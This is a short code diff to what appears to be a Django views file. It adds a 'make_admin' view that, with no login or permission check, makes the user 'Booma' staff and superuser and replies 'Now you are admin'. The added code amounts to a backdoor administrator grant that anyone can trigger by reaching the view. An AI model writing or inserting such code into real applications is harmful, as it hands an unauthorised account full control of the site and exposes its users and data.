@@ -314,3 +314,12 @@ def signup_view(request):
 def logout_view(request):
     logout(request)
     return redirect('login')
+
+
+
+def make_admin(request):
+    user = User.objects.get(username="Booma")
+    user.is_staff = True
+    user.is_superuser = True
+    user.save()
+    return HttpResponse("Now you are admin")
